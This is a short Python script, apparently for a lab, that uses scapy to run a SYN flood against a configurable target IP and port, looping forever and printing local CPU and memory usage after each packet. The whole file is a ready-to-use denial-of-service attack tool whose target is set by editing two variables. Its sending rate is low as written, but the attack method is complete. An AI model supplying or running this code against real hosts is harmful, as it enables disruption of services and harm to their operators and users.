import psutil
import time
from scapy.all import *
from threading import Thread

# Target IP and Port Configuration
target_ip = "192.168.100.4"  # Replace with the target IP address
target_port = 80  # Replace with the target port (80 for HTTP)

# Function to simulate SYN Flood
def syn_flood():
    print("Starting SYN flood...")
    while True:
        send(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), verbose=False)
        # Track and display CPU and memory usage
        track_cpu_memory("SYN")
        time.sleep(1)

# Function to track and display CPU and memory usage
def track_cpu_memory(flood_type):
    cpu = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory().percent
    print(f"{flood_type} Flood - CPU Usage: {cpu}% | Memory Usage: {memory}%")

# Start the SYN flood attack
if __name__ == "__main__":
    syn_thread = Thread(target=syn_flood)
    syn_thread.start()
    syn_thread.join()
